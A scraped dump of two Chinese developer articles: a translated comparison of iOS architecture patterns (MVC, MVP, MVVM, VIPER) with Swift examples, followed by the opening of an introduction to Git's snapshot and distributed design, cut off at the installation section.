<p>在这种架构下，View 是无状态的，在 Model 变化的时候它只是简单的被 Controller 重绘；就像网页一样，点击了一个新的链接，整个网页就重新加载。尽管这种架构可以在 iOS 应用里面实现，但是由于 MVC 的三种实体被紧密耦合着，每一种实体都和其他两种有着联系，所以即便是实现了也没有什么意义。这种紧耦合还戏剧性的减少了它们被重用的可能，这恐怕不是你想要在自己的应用里面看到的。综上，传统 MVC 的例子我觉得也没有必要去写了。</p>
<blockquote><p><em>传统的 MVC 已经不适合当下的 iOS 开发了。</em></p></blockquote>
<h3>Apple 的 MVC</h3>
<h5>理想</h5>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1200/1*c0aGaDNX41qu6e8E4OEgwQ.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Cocoa MVC"" title=""Cocoa MVC""></span></p>
<p>View 和 Model 之间是相互独立的，它们只通过 Controller 来相互联系。有点恼人的是 Controller 是重用性最差的，因为我们一般不会把冗杂的业务逻辑放在 Model 里面，那就只能放在 Controller 里了。</p>
<p>理论上看这么做貌似挺简单的，但是你有没有觉得有点不对劲？你甚至听过有人把 MVC 叫做重控制器模式。另外 <a href=""https://www.objc.io/issues/1-view-controllers/lighter-view-controllers/"" rel=""nofollow noreferrer"">关于 ViewController 瘦身</a> 已经成为 iOS 开发者们热议的话题了。为什么 Apple 要沿用只是做了一点点改进的传统 MVC 架构呢？</p>
<h5>现实</h5>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1600/1*PkWjDU0jqGJOB972cMsrnA.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""现实中的 Cocoa MVC"" title=""现实中的 Cocoa MVC""></span></p>
<p>Cocoa MVC 鼓励你去写重控制器是因为 View 的整个生命周期都需要它去管理，Controller 和 View 很难做到相互独立。虽然你可以把控制器里的一些业务逻辑和数据转换的工作交给 Model，但是你再想把负担往 View 里面分摊的时候就没办法了；因为 View 的主要职责就只是讲用户的操作行为交给 Controller 去处理而已。于是 ViewController 最终就变成了所有东西的代理和数据源，甚至还负责网络请求的发起和取消，还有...剩下的你来讲。</p>
<p>像下面这种代码你应该不陌生吧：</p>
<pre><code>var userCell = tableView.dequeueReusableCellWithIdentifier(""identifier"") as UserCell
userCell.configureWithUser(user)</code></pre>
<p>Cell 作为一个 View 直接用 Model 来完成了自身的配置，MVC 的原则被打破了，这种情况一直存在，而且还没人觉得有什么问题。如果你是严格遵循 MVC 的话，你应该是在 ViewController 里面去配置 Cell，而不是直接将 Model 丢给 Cell，当然这样会让你的 ViewController 更重。</p>
<blockquote><p><em>Cocoa MVC 被戏称为重控制器模式还是有原因的。</em></p></blockquote>
<p>问题直到开始 <a href=""http://nshipster.com/unit-testing/"" rel=""nofollow noreferrer"">单元测试</a>（希望你的项目里面已经有了）之后才开始显现出来。Controller 测试起来很困难，因为它和 View 耦合的太厉害，要测试它的话就需要频繁的去 mock View 和 View 的生命周期；而且按照这种架构去写控制器代码的话，业务逻辑的代码也会因为视图布局代码的原因而变得很散乱。</p>
<p>我们来看下面这段 playground 中的例子：</p>
<pre><code>import UIKit

struct Person { // Model
    let firstName: String
    let lastName: String
}

class GreetingViewController : UIViewController { // View + Controller
    var person: Person!
    let showGreetingButton = UIButton()
    let greetingLabel = UILabel()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.showGreetingButton.addTarget(self, action: ""didTapButton:"", forControlEvents: .TouchUpInside)
    }
    
    func didTapButton(button: UIButton) {
        let greeting = ""Hello"" + "" "" + self.person.firstName + "" "" + self.person.lastName
        self.greetingLabel.text = greeting
        
    }
    // layout code goes here
}
// Assembling of MVC
let model = Person(firstName: ""David"", lastName: ""Blaine"")
let view = GreetingViewController()
view.person = model;</code></pre>
<blockquote><p><em>MVC 的组装，可以放在当前正在显示的 ViewController 里面</em></p></blockquote>
<p>这段代码看起来不太好测试对吧？我们可以把 <code>greeting</code> 的生成方法放到一个新类 <code>GreetingModel</code> 里面去单独测试。但是我们如果不调用与 View 相关的方法的话 （<code>viewDidLoad, didTapButton</code>），就测试不到 <code>GreetingViewController</code> 里面任何的显示逻辑（虽然在上面这个例子里面，逻辑已经很少了）；而调用的话就可能需要把所有的 View 都加载出来，这对单元测试来说太不利了。</p>
<p>实际上，在模拟器（比如 iPhone 4S）上运行并测试 View 的显示并不能保证在其他设备上（比如 iPad）也能良好运行。所以我建议把「Host Application」从你的单元测试配置项里移除掉，然后在不启动模拟器的情况下去跑你的单元测试。</p>
<blockquote><p><em>View 和 Controller 之间的交互，<a href=""http://ashfurrow.com/blog/whats-worth-unit-testing-in-objective-c/"" rel=""nofollow noreferrer"">并不能真正的被单元测试覆盖</a>。</em></p></blockquote>
<p>综上所述，Cocoa MVC 貌似并不是一个很好的选择。但是我们还是评估一下他在各方面的表现（在文章开头有讲）：</p>
<ul>
<li><p><strong>划分</strong> - View 和 Model 确实是实现了分离，但是 View 和 Controller 耦合的太厉害</p></li>
<li><p><strong>可测性</strong> - 因为划分的不够清楚，所以能测的基本就只有 Model 而已</p></li>
<li><p><strong>易用</strong> - 相较于其他模式，它的代码量最少。而且基本上每个人都很熟悉它，即便是没太多经验的开发者也能维护。</p></li>
</ul>
<p>在这种情况下你可以选择 Cocoa MVC：你并不想在架构上花费太多的时间，而且你觉得对于你的小项目来说，花费更高的维护成本只是浪费而已。</p>
<blockquote><p><em>如果你最看重的是开发速度，那么 Cocoa MVC 就是你最好的选择。</em></p></blockquote>
<h3>MVP - 保证了职责划分的（promises delivered） Cocoa MVC</h3>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1600/1*hKUCPEHg6TDz6gtOlnFYwQ.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""MVP - View 被动更新"" title=""MVP - View 被动更新""></span></p>
<p>看起来确实很像 Apple 的 MVC 对吧？确实蛮像，它的名字是 <a href=""https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93presenter"" rel=""nofollow noreferrer"">MVP</a>（被动变化的 View）。稍等...这个意思是说 Apple 的 MVC 实际上是 MVP 吗？不是的，回想一下，在 MVC 里面 View 和 Controller 是耦合紧密的，但是对于 MVP 里面的 Presenter 来讲，它完全不关注 ViewController 的生命周期，而且 View 也能被简单 mock 出来，所以在 Presenter 里面基本没什么布局相关的代码，它的职责只是通过数据和状态更新 View。</p>
<blockquote><p><strong>如果我跟你讲 UIViewController 在这里的角色其实是 View 你感觉如何。</strong></p></blockquote>
<p>在 MVP 架构里面，UIViewController 的那些子类其实是属于 View 的，而不是 Presenter。这种区别提供了极好的可测性，但是这是用开发速度的代价换来的，因为你必须要手动的去创建数据和绑定事件，像下面这段代码中做的一样：</p>
<pre><code>import UIKit

struct Person { // Model
    let firstName: String
    let lastName: String
}

protocol GreetingView: class {
    func setGreeting(greeting: String)
}

protocol GreetingViewPresenter {
    init(view: GreetingView, person: Person)
    func showGreeting()
}

class GreetingPresenter : GreetingViewPresenter {
    unowned let view: GreetingView
    let person: Person
    required init(view: GreetingView, person: Person) {
        self.view = view
        self.person = person
    }
    func showGreeting() {
        let greeting = ""Hello"" + "" "" + self.person.firstName + "" "" + self.person.lastName
        self.view.setGreeting(greeting)
    }
}

class GreetingViewController : UIViewController, GreetingView {
    var presenter: GreetingViewPresenter!
    let showGreetingButton = UIButton()
    let greetingLabel = UILabel()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.showGreetingButton.addTarget(self, action: ""didTapButton:"", forControlEvents: .TouchUpInside)
    }
    
    func didTapButton(button: UIButton) {
        self.presenter.showGreeting()
    }
    
    func setGreeting(greeting: String) {
        self.greetingLabel.text = greeting
    }
    
    // layout code goes here
}
// Assembling of MVP
let model = Person(firstName: ""David"", lastName: ""Blaine"")
let view = GreetingViewController()
let presenter = GreetingPresenter(view: view, person: model)
view.presenter = presenter</code></pre>
<h5>关于组装方面的重要说明</h5>
<p>MVP 架构拥有三个真正独立的分层，所以在组装的时候会有一些问题，而 MVP 也成了第一个披露了这种问题的架构。因为我们不想让 View 知道 Model 的信息，所以在当前的 ViewController（角色其实是 View）里面去进行组装肯定是不正确的，我们应该在另外的地方完成组装。比如，我们可以创建一个应用层（app-wide）的 Router 服务，让它来负责组装和 View-to-View 的转场。这个问题不仅在 MVP 中存在，在接下来要介绍的模式里面也都有这个问题。</p>
<p>让我们来看一下 MVP 在各方面的表现：</p>
<ul>
<li><p><strong>划分</strong> - 我们把大部分的职责都分配到了 Presenter 和 Model 里面，而 View 基本上不需要做什么（在上面的例子里面，Model 也什么都没做）。</p></li>
<li><p><strong>可测性</strong> - 简直棒，我们可以通过 View 来测试大部分的业务逻辑。</p></li>
<li><p><strong>易用</strong> - 就我们上面那个简单的例子来讲，代码量差不多是 MVC 架构的两倍，但是 MVP 的思路还是蛮清晰的。</p></li>
</ul>
<blockquote><p><em>MVP 架构在 iOS 中意味着极好的可测性和巨大的代码量。</em></p></blockquote>
<h3>MVP - 添加了数据绑定的另一个版本</h3>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1200/1*bkB6Ho_G5De47IkJpaX5XQ.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""MVP - Supervising Presenter"" title=""MVP - Supervising Presenter""></span></p>
<p>还存在着另一种的 MVP - Supervising Controller MVP。这个版本的 MVP 包括了 View 和 Model 的直接绑定，与此同时 Presenter（Supervising Controller）仍然继续处理 View 上的用户操作，控制 View 的显示变化。</p>
<p>但是我们之前讲过，模糊的职责划分是不好的事情，比如 View 和 Model 的紧耦合。这个道理在 Cocoa 桌面应用开发上面也是一样的。</p>
<p>就像传统 MVC 架构一样，我找不到有什么理由需要为这个有瑕疵的架构写一个例子。</p>
<h3>MVVM - 是 MV(X) 系列架构里面最新兴的，也是最出色的</h3>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1600/1*uhPpTHYzTmHGrAZy8hiM7w.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""MVVM"" title=""MVVM""></span></p>
<p><a href=""https://en.wikipedia.org/wiki/Model_View_ViewModel"" rel=""nofollow noreferrer"">MVVM</a> 架构是 MV(X) 里面最新的一个，让我们希望它在出现的时候已经考虑到了 MV(X) 模式之前所遇到的问题吧。</p>
<p>理论上来说，Model - View - ViewModel 看起来非常棒。View 和 Model 我们已经都熟悉了，中间人的角色我们也熟悉了，但是在这里中间人的角色变成了 ViewModel。</p>
<p>它跟 MVP 很像：</p>
<ul>
<li><p>MVVM 架构把 ViewController 看做 View。</p></li>
<li><p>View 和 Model 之间没有紧耦合</p></li>
</ul>
<p>另外，它还像 Supervising 版的 MVP 那样做了数据绑定，不过这次不是绑定 View 和 Model，而是绑定 View 和 ViewModel。</p>
<p>那么，iOS 里面的 ViewModel 到底是个什么东西呢？本质上来讲，他是独立于 UIKit 的， View 和 View 的状态的一个呈现（representation）。ViewModel 能主动调用对 Model 做更改，也能在 Model 更新的时候对自身进行调整，然后通过 View 和 ViewModel 之间的绑定，对 View 也进行对应的更新。</p>
<h5>绑定</h5>
<p>我在 MVP 的部分简单的提过这个内容，在这里让我们再延伸讨论一下。绑定这个概念源于 OS X 平台的开发，但是在 iOS 平台上面，我们并没有对应的开发工具。当然，我们也有 KVO 和 通知，但是用这些方式去做绑定不太方便。</p>
<p>那么，如果我们不想自己去写他们的话，下面提供了两个选择：</p>
<ul>
<li><p>选一个基于 KVO 的绑定库，比如 <a href=""https://github.com/Raizlabs/RZDataBinding"" rel=""nofollow noreferrer"">RZDataBinding</a> 或者 <a href=""https://github.com/SwiftBond/Bond"" rel=""nofollow noreferrer"">SwiftBond</a>。</p></li>
<li><p>使用全量级的 <a href=""https://gist.github.com/JaviLorbada/4a7bd6129275ebefd5a6"" rel=""nofollow noreferrer"">函数式响应编程</a> 框架,比如 <a href=""https://www.google.co.uk/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0CB4QFjAAahUKEwj2l6rZv5jJAhUFUhQKHWahCKs&amp;url=https%3A%2F%2Fgithub.com%2FReactiveCocoa%2FReactiveCocoa&amp;usg=AFQjCNHM-pOkluiSuPsaVwVujCDTknVFUA&amp;sig2=54zu-ATo8vDMvtXbxZYTvQ"" rel=""nofollow noreferrer"">ReactiveCocoa</a>、<a href=""https://github.com/ReactiveX/RxSwift/"" rel=""nofollow noreferrer"">RxSwift</a> 或者 <a href=""https://github.com/mxcl/PromiseKit"" rel=""nofollow noreferrer"">PromiseKit</a>。</p></li>
</ul>
<p>实际上，现在提到「MVVM」你应该就会想到 ReactiveCocoa，反过来也是一样。虽然我们可以通过简单的绑定来实现 MVVM 模式，但是 ReactiveCocoa（或者同类型的框架）会让你更大限度的去理解 MVVM。</p>
<p>响应式编程框架也有一点不好的地方，能力越大责任越大嘛。用响应式编程用得不好的话，很容易会把事情搞得一团糟。或者这么说，如果有什么地方出错了，你需要花费更多的时间去调试。看着下面这张调用堆栈图感受一下：</p>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1600/1*WGIs3XQL1MtKiyApr-m9bg.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Reactive Debugging"" title=""Reactive Debugging""></span></p>
<p>在接下来的这个小例子中，用响应式框架（FRF）或者 KVO 都显得有点大刀小用，所以我们用另一种方式：直接的调用 ViewModel 的 <code>showGreeting</code> 方法去更新自己（的 <code>greeting</code> 属性），（在 <code>greeting</code> 属性的 <code>didSet</code> 回调里面）用 <code>greetingDidChange</code> 闭包函数去更新 View 的显示。</p>
<pre><code>import UIKit

struct Person { // Model
    let firstName: String
    let lastName: String
}

protocol GreetingViewModelProtocol: class {
    var greeting: String? { get }
    var greetingDidChange: ((GreetingViewModelProtocol) -&gt; ())? { get set } // function to call when greeting did change
    init(person: Person)
    func showGreeting()
}

class GreetingViewModel : GreetingViewModelProtocol {
    let person: Person
    var greeting: String? {
        didSet {
            self.greetingDidChange?(self)
        }
    }
    var greetingDidChange: ((GreetingViewModelProtocol) -&gt; ())?
    required init(person: Person) {
        self.person = person
    }
    func showGreeting() {
        self.greeting = ""Hello"" + "" "" + self.person.firstName + "" "" + self.person.lastName
    }
}

class GreetingViewController : UIViewController {
    var viewModel: GreetingViewModelProtocol! {
        didSet {
            self.viewModel.greetingDidChange = { [unowned self] viewModel in
                self.greetingLabel.text = viewModel.greeting
            }
        }
    }
    let showGreetingButton = UIButton()
    let greetingLabel = UILabel()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.showGreetingButton.addTarget(self.viewModel, action: ""showGreeting"", forControlEvents: .TouchUpInside)
    }
    // layout code goes here
}
// Assembling of MVVM
let model = Person(firstName: ""David"", lastName: ""Blaine"")
let viewModel = GreetingViewModel(person: model)
let view = GreetingViewController()
view.viewModel = viewModel</code></pre>
<p>然后，我们再回过头来对它各方面的表现做一个评价：</p>
<ul>
<li><p><strong>划分</strong> - 这在我们的小栗子里面表现的不是很清楚，但是 MVVM 框架里面的 View 比 MVP 里面负责的事情要更多一些。因为前者是通过 ViewModel 的数据绑定来更新自身状态的，而后者只是把所有的事件统统交给 Presenter 去处理就完了，自己本身并不负责更新。</p></li>
<li><p><strong>可测性</strong> - 因为 ViewModel 对 View 是一无所知的，这样我们对它的测试就变得很简单。View 应该也是能够被测试的，但是可能因为它对 UIKit 的依赖，你会直接略过它。</p></li>
<li><p><strong>易用</strong> - 在我们的例子里面，它的代码量基本跟 MVP 持平，但是在实际的应用当中 MVVM 会更简洁一些。因为在 MVP 下你必须要把 View 的所有事件都交给 Presenter 去处理，而且需要手动的去更新 View 的状态；而在 MVVM 下，你只需要用绑定就可以解决。</p></li>
</ul>
<blockquote><p><em>MVVM 真的很有魅力，因为它不仅结合了上述几种框架的优点，还不需要你为视图的更新去写额外的代码（因为在 View 上已经做了数据绑定），另外它在可测性上的表现也依然很棒。</em></p></blockquote>
<h3>VIPER - 把搭建乐高积木的经验应用到 iOS 应用的设计上</h3>
<p><span class=""img-wrap""><img data-src=""https://cdn-images-1.medium.com/max/1600/1*0pN3BNTXfwKbf08lhwutag.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""VIPER"" title=""VIPER""></span></p>
<p><a href=""https://www.objc.io/issues/13-architecture/viper/"" rel=""nofollow noreferrer"">VIPER</a> 是我们最后一个要介绍的框架，这个框架比较有趣的是它不属于任何一种 MV(X) 框架。</p>
<p>到目前为止，你可能觉得我们把职责划分成三层，这个颗粒度已经很不错了吧。现在 VIPER 从另一个角度对职责进行了划分，这次划分了 <strong>五层</strong>。</p>
<ul>
<li><p><strong>Interactor（交互器）</strong> - 包括数据（Entities）或者网络相关的业务逻辑。比如创建新的 entities 或者从服务器上获取数据；要实现这些功能，你可能会用到一些服务和管理（Services and Managers）：这些可能会被误以为成是外部依赖东西，但是它们就是 VIPER 的 Interactor 模块。</p></li>
<li><p><strong>Presenter（展示器）</strong> - 包括 UI（but UIKit independent）相关的业务逻辑，可以调用 Interactor 中的方法。</p></li>
<li><p><strong>Entities（实体）</strong> - 纯粹的数据对象。不包括数据访问层，因为这是 Interactor 的职责。</p></li>
<li><p><strong>Router（路由）</strong> - 负责 VIPER 模块之间的转场</p></li>
</ul>
<p>实际上 VIPER 模块可以只是一个页面（screen），也可以是你应用里整个的用户使用流程（the whole user story）- 比如说「验证」这个功能，它可以只是一个页面，也可以是连续相关的一组页面。你的每个「乐高积木」想要有多大，都是你自己来决定的。</p>
<p>如果我们把 VIPER 和 MV(X) 系列做一个对比的话，我们会发现它们在职责划分上面有下面的一些区别：</p>
<ul>
<li><p><strong>Model</strong>（数据交互）的逻辑被转移到了 Interactor 里面，Entities 只是一个什么都不用做的数据结构体。</p></li>
<li><p><strong>Controller/Presenter/ViewModel</strong> 的职责里面，只有 UI 的展示功能被转移到了 Presenter 里面。Presenter 不具备直接更改数据的能力。</p></li>
<li><p>VIPER 是第一个把导航的职责单独划分出来的架构模式，负责导航的就是 <strong>Router</strong> 层。</p></li>
</ul>
<blockquote><p><em>如何正确的使用导航（doing routing）对于 iOS 应用开发来说是一个挑战，MV(X) 系列的架构完全就没有意识到（所以也不用处理）这个问题。</em></p></blockquote>
<p>下面的这个列子并没有涉及到导航和 VIPER 模块间的转场，同样上面 MV(X) 系列架构里面也都没有涉及。</p>
<pre><code>import UIKit

struct Person { // Entity (usually more complex e.g. NSManagedObject)
    let firstName: String
    let lastName: String
}

struct GreetingData { // Transport data structure (not Entity)
    let greeting: String
    let subject: String
}

protocol GreetingProvider {
    func provideGreetingData()
}

protocol GreetingOutput: class {
    func receiveGreetingData(greetingData: GreetingData)
}

class GreetingInteractor : GreetingProvider {
    weak var output: GreetingOutput!
    
    func provideGreetingData() {
        let person = Person(firstName: ""David"", lastName: ""Blaine"") // usually comes from data access layer
        let subject = person.firstName + "" "" + person.lastName
        let greeting = GreetingData(greeting: ""Hello"", subject: subject)
        self.output.receiveGreetingData(greeting)
    }
}

protocol GreetingViewEventHandler {
    func didTapShowGreetingButton()
}

protocol GreetingView: class {
    func setGreeting(greeting: String)
}

class GreetingPresenter : GreetingOutput, GreetingViewEventHandler {
    weak var view: GreetingView!
    var greetingProvider: GreetingProvider!
    
    func didTapShowGreetingButton() {
        self.greetingProvider.provideGreetingData()
    }
    
    func receiveGreetingData(greetingData: GreetingData) {
        let greeting = greetingData.greeting + "" "" + greetingData.subject
        self.view.setGreeting(greeting)
    }
}

class GreetingViewController : UIViewController, GreetingView {
    var eventHandler: GreetingViewEventHandler!
    let showGreetingButton = UIButton()
    let greetingLabel = UILabel()

    override func viewDidLoad() {
        super.viewDidLoad()
        self.showGreetingButton.addTarget(self, action: ""didTapButton:"", forControlEvents: .TouchUpInside)
    }
    
    func didTapButton(button: UIButton) {
        self.eventHandler.didTapShowGreetingButton()
    }
    
    func setGreeting(greeting: String) {
        self.greetingLabel.text = greeting
    }
    
    // layout code goes here
}
// Assembling of VIPER module, without Router
let view = GreetingViewController()
let presenter = GreetingPresenter()
let interactor = GreetingInteractor()
view.eventHandler = presenter
presenter.view = view
presenter.greetingProvider = interactor
interactor.output = presenter</code></pre>
<p>我们再来评价下它在各方面的表现：</p>
<ul>
<li><p><strong>划分</strong> - 毫无疑问的，VIPER 在职责划分方面是做的最好的。</p></li>
<li><p><strong>可测性</strong> - 理所当然的，职责划分的越好，测试起来就越容易</p></li>
<li><p><strong>易用</strong> - 最后，你可能已经猜到了，上面两点好处都是用维护性的代价换来的。一个小小的任务，可能就需要你为各种类写大量的接口。</p></li>
</ul>
<h5>那么，我们到底应该给「乐高」一个怎样的评价呢？</h5>
<p>如果你在使用 VIPER 框架的时候有一种在用乐高积木搭建帝国大厦的感觉，那么你可能 <a href=""https://inessential.com/2014/03/16/smaller_please"" rel=""nofollow noreferrer"">正在犯错误</a>；可能对于你负责的应用来说，还没有到使用 VIPER 的时候，你应该把一些事情考虑的再简单一些。总是有一些人忽视这个问题，继续扛着大炮去打小鸟。我觉得可能是因为他们相信，虽然目前来看维护成本高的不合常理，但是至少在将来他们的应用可以从 VIPER 架构上得到回报吧。如果你也跟他们的观点一样的话，那我建议你尝试一下 <a href=""https://github.com/rambler-ios/Generamba"" rel=""nofollow noreferrer"">Generamba</a> - 一个可以生成 VIPER 框架的工具。虽然对于我个人来讲，这感觉就像给大炮装上了一个自动瞄准系统，然后去做一件只用弹弓就能解决的事情。</p>
<h3>结论</h3>
<p>我们简单了解了几种架构模式，对于那些让你困惑的问题，我希望你已经找到了答案。但是毫无疑问，你应该已经意识到了，在选择架构模式这件问题上面，不存在什么 <a href=""http://baike.baidu.com/subview/346981/10812943.htm?fromtitle=silver+bullet&amp;fromid=514963&amp;type=syn"" rel=""nofollow noreferrer"">银色子弹</a>，你需要做的就是具体情况具体分析，权衡利弊而已。</p>
<p>因此在同一个应用里面，即便有几种混合的架构模式也是很正常的一件事情。比如：开始的时候，你用的是 MVC 架构，后来你意识到有一个特殊的页面用 MVC 做的的话维护起来会相当的麻烦；这个时候你可以只针对这一个页面用 MVVM 模式去开发，对于之前那些用 MVC 就能正常工作的页面，你完全没有必要去重构它们，因为两种架构是完全可以和睦共存的。</p>
<hr>
<blockquote><p>更新：<a href=""http://slides.com/borlov/arch/fullscreen#/"" rel=""nofollow noreferrer"">这里有个简短的 PPT</a><br>原文链接：<a href=""https://medium.com/ios-os-x-development/ios-architecture-patterns-ecba4c38de52#.hij705e7r"" rel=""nofollow noreferrer"">https://medium.com/ios-os-x-development/ios-architecture-patterns-ecba4c38de52#.hij705e7r</a></p></blockquote>

                "," iOS 架构模式 - 简述 MVC, MVP, MVVM 和 VIPER (译)",1531972052,195,1,446,1,1,https://segmentfault.com/a/1190000004680605
116,1,0,6,"
                    
<p>Git 主张的分布式代码库与文件快照的设计思想，相对于传统 CVS、SVN 等集中式、文件差异式版本控制工具是一种挑战与颠覆。Git 带来了离线提交、轻量级分支等诸多便利。不过，也有人质疑 Git 的复杂性，并由此拔高了学习成本，某种程序上影响了开发者使用或者迁移 Git 的项目进度，笔者同样感同身受，这也是本文的出发点。</p>
<p>不同于各种 Git 用法指南，本文在介绍 Git 安装、使用的同时，更加注重于 Git 的设计思想、体系架构、以及各种实用功能，包括 Git 分支模型、Git 标签、Git 补丁提交、CVS 迁移 Git、SVN 迁移 Git 等。</p>
<h2><strong>背景</strong></h2>
<p>Git 是一个开源的分布式版本控制软件。在英式英语中，Git 指一个愚笨或者不开心的人，恐怕与 Git 发明人——Linux 教父 Linus Torvalds 当时的自嘲心理不无关系吧。2002 年之前，Linux 内核维护工作的绝大部分时间都浪费在提交补丁与保存归档等繁琐事务上。启用版本控制工具 BitKeeper 管理 Linux 内核成了当务之急。不过，BitKeeper 毕竟是一款商业软件，在经历了 3 年免费使用之后，Linux 社区不得不寻求它的替代品，以便继续托管 Linux 内核源代码。2005 年，迫于无奈，Linus Torvalds 自行开发了一套开源版本控制工具，并命名为 Git。</p>
<p>自诞生以来，Git 就以其开源、简单、快捷、分布式、高效等特点，应付了类似 Linux 内核源代码等各种复杂的项目开发需求。如今，Git 已经非常成熟，被广泛接受与使用，越来越多的项目都迁移到 Git 仓库中进行管理。以 Eclipse 社区为例。据称，目前 80% 的 Eclipse 基金会项目已经完全使用 Git 管理，CVS 访问权限已经切换成只读状态。并且，在 Eclipse 基金会官网中，针对项目管理的介绍中已将""CVS""三个字符划掉，而且很萌地写道，""Ding dong, the witch is dead.""，意思是""叮咚，那个老巫婆已经挂了""。</p>
<p>不仅如此，笔者最近也收到了全球最大开源代码托管平台——SourceForge 的升级通知。其中，笔者的一个较为简单的项目已经从 CVS 被系统默认自动升级到了 Git。而对于另一个较为复杂的 CVS 项目Toolbox for Java/JTOpen，SourceForge 并没有自动升级，估计是等待笔者做升级前的最后准备工作。笔者希望通过分享自己的 Git 学习体验与实践经验，对 Git 初学者有所裨益，这也是本文之意义所在。</p>
<h2><strong>为什么选择 Git</strong></h2>
<p>实际上，相对于 CVS、SVN 等主流版本控制软件，Git 的学习成本甚至会更高。比如，对于 Subversion 用户而言，如果能理解什么是文件、工作目录、资源库、版本、分支和标签等概念，差不多就够用了。而对于 Git 用户，需要理解更多更复杂的概念，包括文件、快照、工作树、索引、本地资源库、远程资源库、远程、提交、分支和 Stash 等。那么，为什么软件开发者对 Git 还是趋之若鹜呢？相比于 CVS 与 SVN，Git 的优势到底体现在哪里？</p>
<p>关于 Git 的各种优势，互联网以及各种 Git 书籍都给出了自己的答案。笔者认为，存储快照与分布式的设计思想是 Git 的 2 大看点，理由如下：</p>
<p><strong>第一，Git 底层自行维护的存储文件系统是一大亮点。</strong>CVS、SVN 底层采用的为增量式文件系统，如图 1 所示。增量式文件系统的特点是：当文件变动发生提交时，该文件系统存储的是文件的差异信息。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6xH"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image001.png"" title=""image001.png""></span><br><em>图 1. CVS、SVN 记录文件内容差异</em></p>
<p>同样是文件变更提交，Git 底层文件系统存储的则为文件快照，即整个文件内容，并保存指向快照的索引，如图 2 所示。考虑到性能因素，如果文件内容没有发生任何变化，该文件系统则不会重复保存文件，只是简单地保存文件的链接。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6xM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image002.png"" title=""image002.png""></span><br><em>图 2. Git 记录整个文件快照</em></p>
<p>Git 之所以选择这样的底层存储数据结构，主要是为了提高 Git 分支的使用效率。实际上，Git 分支本质上是一个指向索引对象的可变指针，而每一个索引对象又指向文件快照，如图 3 所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6xT"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image003.png"" title=""image003.png""></span><br><em>图 3. Git 分支对应的数据结构</em></p>
<p>这样一来，创建分支可以瞬间完成，几乎不需要花费太多代价。换句话说，Git 分支是廉价的、轻量级的。我们看看各种 CVS、SVN 项目，分支通常意味着源代码的完整拷贝，其代价是昂贵的、重量级的。而对于大型项目来说，创建各种分支又是十分必要的，这与 Git 鼓励频繁创建与合并分支的理念相吻合。</p>
<p><strong>第二，Git 版本控制系统的设计思想是""去中心化""。</strong>传统的 CVS 、SVN 等工具采用的是 C/S 架构，只有一个中心代码仓库，位于服务器端。而一旦由于服务器系统宕机、网络不通等各种原因造成中心仓库不可用，整个 CVS 、SVN 系统的代码检入与检出就瘫痪了。即便考虑到高可用性，通过迁移另一个中心仓库继续代码提交操作，相应的运营维护成本也会随之上升。</p>
<p>为了摆脱对中心仓库的依赖，Git 的初始设计目标之一就是分布式控制管理。我们给出一个样例，如图 4 所示。假如我们成立一个项目组，开发者主要由 Alice、Bob、Clair、David 四名成员组成。其中，除了中心仓库 origin（Git 默认远程仓库名称）之外，每一名成员各自负责一个本地仓库。从分布式的观点来看，David 可看成是 Alice 的远程仓库，反过来也是一样。Git 分布式的设计理念有助于减少对中心仓库的依赖，从而有效降低中心仓库的负载，改善代码提交的灵活性。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVs6xV"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image004.png"" title=""image004.png""></span><br><em>图 4. Git 分布式工作示意图</em></p>
<p>Git 分布式设计思想所带来的另外一大好处是支持离线工作。离线工作的好处不言而喻，对于 CVS、SVN 这种严重依赖网络的 C/S 工具而言，没有了网络或者 VPN ，就意味着失去了左膀右臂，代码检入与检出操作就无法正常进行。而一旦使用 Git ，即便在没有 WIFI 的飞机或者火车上，照样可以频繁地提交代码，只不过先提交到本地仓库，等到了网络连通的时候，再上传到远程的镜像仓库。</p>
<p>有关 Git 更多详细信息，请参考 Git 官方网站：<a href=""http://git-scm.com"" rel=""nofollow noreferrer"">http://git-scm.com</a>‎。</p>
<p>工欲善其事，必先利其器。在理解 Git 灵活的快照存储与分布式设计理念之后，我们介绍 Git 针对不同操作系统的安装过程。需要指出的是，这里仅仅粗线条地介绍 Git 的安装方法，至于 Git 安装前提条件、安装过程出现的问题诊断等更加详细的内容描述，均不在本文的讨论范围。</p>
<h2><strong>如何安装 Git</strong></h2>
<p>总结起来，Git 安装方式通常分为两种：一种是选择 Git 源码编译安装；另一种使用针对特定平台的二进制安装包，又可以细分为 Linux、Mac、Windows 等，其安装说明如下。</p>
<h3><strong>1. 源码编译安装</strong></h3>
